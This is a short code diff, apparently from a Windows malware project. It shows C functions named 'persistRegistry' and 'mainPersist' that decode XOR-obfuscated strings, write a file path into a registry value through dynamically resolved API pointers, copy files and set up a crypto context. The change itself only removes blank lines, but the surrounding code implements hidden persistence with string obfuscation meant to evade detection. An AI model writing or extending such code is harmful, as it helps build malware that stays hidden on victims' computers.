@@ -111,7 +111,6 @@ int persistRegistry() {
 	BYTE fileName_key[5] = { 108, 194, 42, 43, 219 };
 	BYTE fileName_str[13] = { 222, 88, 184, 177, 4, 208, 79, 172, 164, 80, 252, 79, 213 };
 	resolveStringPersist(fileName_str, fileName_key, 13);
-
 	if (TempRegSetKeyValueA1(hKey, NULL, (LPCSTR)fileName_str, REG_SZ, tempFile_path, strlen(tempFile_path)) != ERROR_SUCCESS) {
 		return -1;
 	}
@@ -147,7 +146,6 @@ int mainPersist() {
 	if (!TempCopyFileA1) {
 		populateApiPersist();
 	}
-
 
 	if (acquireContext(&hCryptProv) == -1) {
 		goto CLEANUP;
